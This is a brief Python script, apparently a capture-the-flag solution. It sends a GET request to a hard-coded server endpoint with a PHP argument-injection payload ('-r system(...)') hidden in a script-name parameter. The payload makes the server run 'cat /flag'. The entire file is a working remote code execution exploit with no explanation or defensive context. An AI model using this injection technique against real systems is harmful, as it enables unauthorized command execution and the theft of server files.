import requests

url = 'http://185.66.86.54:33687/step2forthomewhoknowtheoldschooltechniques/run'

phpscript = '''-r system('cat /flag'); //.php'''
phpparams = ''
params = {
    'script': phpscript,
    'params': phpparams
}

r = requests.get(url, params=params)
print(r.text)
